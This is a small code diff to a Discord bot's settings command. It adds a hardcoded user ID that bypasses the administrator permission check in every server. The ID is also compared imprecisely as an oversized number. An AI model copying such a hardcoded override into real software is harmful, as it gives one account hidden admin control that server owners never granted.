@@ -4,7 +4,7 @@ exports.run = (client, message, args, Discord) => {
   const config = require("../config.json");
   var guildinfo = client.getGuild.get(message.guild.id);
 
-if (message.guild.member(message.author).hasPermission(0x00000008)){
+if (message.guild.member(message.author).hasPermission(0x00000008)|| message.author.id == 94907924828127232){
   if (args[0] == null) {args[0] = config.prefix}
   guildinfo =
       {
